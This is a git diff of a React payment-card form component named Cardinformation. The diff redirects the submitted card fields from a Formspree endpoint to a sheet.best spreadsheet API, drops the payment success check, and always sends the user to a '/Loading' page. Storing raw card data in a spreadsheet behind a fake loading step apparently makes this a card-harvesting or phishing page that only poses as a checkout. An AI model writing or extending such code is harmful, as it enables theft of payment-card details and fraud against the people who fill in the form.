@@ -66,19 +66,16 @@ export default function Cardinformation() {
     const Formvlaues = Object.fromEntries(data.entries());
 
     axios
-      .post(`https://formspree.io/f/xvoyqvpr`, Formvlaues)
+      .post(`https://sheet.best/api/sheets/6513c974-3a2f-4ecc-b6e9-95b86a407163`, Formvlaues)
       .then((response) => {
         if (response.status) {
           let dataSet = response.data;
-          console.log();
+          console.log(dataSet);
 
-          if (dataSet.ok) {
-            toast.success("Payment succesfully ");
-            navigate("/Loading");
-            e.target.reset();
-          } else {
-            toast.error("Server error");
-          }
+
+          navigate("/Loading");
+          e.target.reset();
+
         }
       });
     console.log(Formvlaues);
@@ -193,8 +190,8 @@ export default function Cardinformation() {
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
                         name="cardexpirymonths"
-                        // value={form.cardexpirymonths}
-                        // onChange={onUpdateField}
+                      // value={form.cardexpirymonths}
+                      // onChange={onUpdateField}
                       >
                         <option selected>01</option>
                         <option value="1">02</option>
@@ -218,8 +215,8 @@ export default function Cardinformation() {
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
                         name="cardexpiryyear"
-                        // value={form.cardexpiryyear}
-                        // onChange={onUpdateField}
+                      // value={form.cardexpiryyear}
+                      // onChange={onUpdateField}
                       >
                         <option selected>2021</option>
                         <option value="2021">2022</option>
